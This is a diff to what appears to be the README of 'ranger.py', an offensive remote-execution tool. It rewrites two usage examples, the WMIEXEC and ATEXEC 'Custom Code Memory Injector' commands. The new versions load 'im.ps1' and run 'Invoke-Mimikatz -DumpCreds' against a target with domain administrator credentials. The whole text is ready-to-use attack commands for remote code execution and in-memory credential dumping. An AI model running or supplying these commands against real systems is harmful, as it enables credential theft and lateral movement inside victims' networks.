@@ -99,7 +99,7 @@ ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --
 
 ###WMIEXEC Custom Code Memory Injector:
 ```
-ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe"
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c -x "im.ps1" -f "Invoke-Mimikatz -DumpCreds"
 ```
 
 ###ATEXEC Command Execution:
@@ -119,7 +119,7 @@ ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --
 
 ###ATEXEC Custom Code Memory Injector:
 ```
-ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe" --no-encoder
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -x "im.ps1" -f "Invoke-Mimikatz -DumpCreds" --no-encoder
 ```
 
 ###SECRETSDUMP Custom Code Memory Injector:
